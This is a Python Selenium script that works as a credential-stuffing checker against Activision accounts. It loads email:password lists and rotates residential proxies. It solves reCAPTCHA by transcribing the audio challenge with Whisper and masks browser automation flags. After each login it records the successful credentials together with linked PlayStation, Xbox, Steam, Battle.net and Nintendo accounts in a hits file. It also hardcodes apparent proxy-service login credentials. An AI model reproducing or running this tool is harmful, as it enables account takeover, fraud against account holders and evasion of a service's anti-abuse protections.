import os
import time
import logging
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests
import whisper
import warnings
from selenium.common.exceptions import ElementClickInterceptedException, NoSuchElementException, TimeoutException

warnings.filterwarnings("ignore")

# Set the ffmpeg path relative to the main directory
ffmpeg_path = os.path.join(os.getcwd(), 'ffmpeg-7.0.1-essentials_build', 'bin', 'ffmpeg.exe')
os.environ["PATH"] += os.pathsep + os.path.dirname(ffmpeg_path)

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize Whisper model
model = whisper.load_model("base")

def load_credentials(file_path):
    with open(file_path, 'r') as file:
        credentials = [line.strip().split(':') for line in file.readlines()]
    return credentials

def transcribe(url):
    audio_dir = 'audio'
    os.makedirs(audio_dir, exist_ok=True)
    temp_file = os.path.join(audio_dir, 'temp_audio.mp3')
    
    # Download the audio file
    logging.debug("Downloading audio file from URL.")
    with open(temp_file, 'wb') as f:
        f.write(requests.get(url).content)
    logging.debug(f"Audio file saved as {temp_file}")
    
    # Transcribe the audio file
    result = model.transcribe(temp_file)
    logging.debug(f"Transcription result: {result['text'].strip()}")
    return result["text"].strip()

def click_checkbox(driver):
    driver.switch_to.default_content()
    driver.switch_to.frame(driver.find_element(By.XPATH, ".//iframe[@title='reCAPTCHA']"))
    driver.find_element(By.ID, "recaptcha-anchor").click()
    driver.switch_to.default_content()

def request_audio_version(driver):
    driver.switch_to.default_content()
    driver.switch_to.frame(driver.find_element(By.XPATH, ".//iframe[@title='recaptcha challenge expires in two minutes']"))
    driver.find_element(By.ID, "recaptcha-audio-button").click()

def solve_audio_captcha(driver):
    driver.switch_to.default_content()
    driver.switch_to.frame(driver.find_element(By.XPATH, ".//iframe[@title='recaptcha challenge expires in two minutes']"))
    audio_source = driver.find_element(By.ID, "audio-source").get_attribute('src')
    logging.debug(f"Audio source URL: {audio_source}")
    
    # Transcribe the audio
    text = transcribe(audio_source)
    
    # Enter the transcribed text
    driver.find_element(By.ID, "audio-response").send_keys(text)
    driver.find_element(By.ID, "recaptcha-verify-button").click()

def ensure_clickable_and_click(driver, element):
    driver.execute_script("""
        arguments[0].style.display = 'block';
        arguments[0].style.visibility = 'visible';
        arguments[0].style.position = 'relative';
        arguments[0].style.height = 'auto';
        arguments[0].style.width = 'auto';
        arguments[0].style.zIndex = 1000;
    """, element)
    element.click()

def verify_login(driver):
    try:
        WebDriverWait(driver, 30).until(lambda driver: driver.current_url != "https://s.activision.com/activision/login?redirectUrl=https://www.activision.com/")
        logging.info("Login successful")
        return True
    except TimeoutException:
        logging.error("Login verification timed out")
        return False

def extract_linked_accounts(driver):
    accounts = []
    account_types = {
        "psn": "Playstation",
        "battle": "Battle.net",
        "xbl": "Xbox Live",
        "steam": "Steam",
        "nintendo": "Nintendo"
    }
    for account_type, account_name in account_types.items():
        try:
            account_element = driver.find_element(By.CSS_SELECTOR, f"li.{account_type} .account-link")
            if "Unlink" in account_element.get_attribute('aria-label'):
                accounts.append(account_name)
        except NoSuchElementException:
            logging.error(f"{account_name} account element not found")
    return accounts

def get_new_proxy():
    username = "geonode_eJnkZtomfF"
    password = "9bd3ee4b-77fd-47d7-bab4-c32075c44f2b"
    GEONODE_DNS = "premium-residential.geonode.com:9000"
    proxy_url = "http://{}:{}@{}".format(username, password, GEONODE_DNS)
    return proxy_url

def login_and_extract(driver, email, password):
    logging.info(f"Attempting login for {email}")
    driver.get("https://s.activision.com/activision/login?redirectUrl=https://www.activision.com/")
    logging.info("Activision login page loaded")
    
    time.sleep(5)
    
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email)
        logging.info(f"Entered email: {email}")
        
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "password"))).send_keys(password)
        logging.info("Entered password")
        
        click_checkbox(driver)
        time.sleep(2)
        
        request_audio_version(driver)
        time.sleep(2)
        
        solve_audio_captcha(driver)
        time.sleep(10)
        
        driver.switch_to.default_content()
        try:
            sign_in_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, "button[type='submit']")))
            ensure_clickable_and_click(driver, sign_in_button)
            logging.info("Clicked the sign-in button")
        except NoSuchElementException:
            logging.error("Sign-in button not found")
        except ElementClickInterceptedException:
            logging.error("Sign-in button was blocked")
            ensure_clickable_and_click(driver, sign_in_button)
        
        time.sleep(5)
        
        if verify_login(driver):
            driver.get("https://s.activision.com/activision/profile")
            logging.info("Navigated to profile page")
            
            time.sleep(5)
            
            linked_accounts = extract_linked_accounts(driver)
            linked_accounts_str = " / ".join(linked_accounts)
            with open('checkedaccounts.txt', 'a') as file:
                file.write(f"{email}:{password} / {linked_accounts_str}\n")
            logging.info(f"Saved linked accounts for {email}")
    except Exception as e:
        logging.error(f"An error occurred during login attempt with {email}: {e}")

def main():
    credentials = load_credentials('accounts.txt')
    
    service = Service(executable_path="./chromedriver.exe")

    for email, password in credentials:
        proxy_url = get_new_proxy()
        
        options = Options()
        options.add_argument("--incognito")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-extensions")
        
        proxy = Proxy()
        proxy.proxy_type = ProxyType.MANUAL
        proxy.http_proxy = proxy_url
        proxy.ssl_proxy = proxy_url
        options.Proxy = proxy

        driver = webdriver.Chrome(service=service, options=options)
        login_and_extract(driver, email, password)
        driver.quit()
        logging.info("Browser closed and reopened for next account")

if __name__ == "__main__":
    main()
